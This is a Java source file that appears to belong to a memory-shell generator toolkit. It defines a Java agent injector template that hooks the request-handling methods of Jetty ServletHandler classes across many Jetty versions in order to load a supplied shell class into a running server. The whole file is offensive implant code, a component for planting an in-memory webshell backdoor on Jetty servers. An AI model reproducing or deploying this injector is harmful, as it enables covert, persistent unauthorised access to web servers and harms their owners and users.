package org.leo.jmg.mem.injectortpl.jetty;

import org.leo.jmg.mem.agent.AgentInjectorSupport;

import java.lang.instrument.Instrumentation;

/** Jetty 5/6/9/10/11/12 Handler Agent 挂载模板。 */
public class JettyHandlerAgentInjector extends AgentInjectorSupport {
    private static String shellClassName;
    private static String shellClass;
    private static final String[] TARGET_CLASSES = new String[]{
            "org/eclipse/jetty/servlet/ServletHandler",
            "org/eclipse/jetty/ee8/servlet/ServletHandler",
            "org/eclipse/jetty/ee9/servlet/ServletHandler",
            "org/eclipse/jetty/ee10/servlet/ServletHandler$Chain",
            "org/eclipse/jetty/ee11/servlet/ServletHandler$Chain",
            "org/mortbay/jetty/servlet/ServletHandler"
    };

    public static void premain(String arguments, Instrumentation instrumentation) throws Exception {
        launch(instrumentation, new JettyHandlerAgentInjector());
    }

    public static void agentmain(String arguments, Instrumentation instrumentation) throws Exception {
        launch(instrumentation, new JettyHandlerAgentInjector());
    }

    @Override
    protected String[] targetClasses() { return TARGET_CLASSES; }

    @Override
    protected String targetMethodName() { return "doHandle"; }

    @Override
    protected String[] targetMethodNames(String className) {
        return className != null && className.indexOf("mortbay") >= 0
                ? new String[]{"handle"} : new String[]{"doHandle"};
    }

    @Override
    protected String shellClassName() { return shellClassName; }

    @Override
    protected String shellClassPayload() { return shellClass; }
}
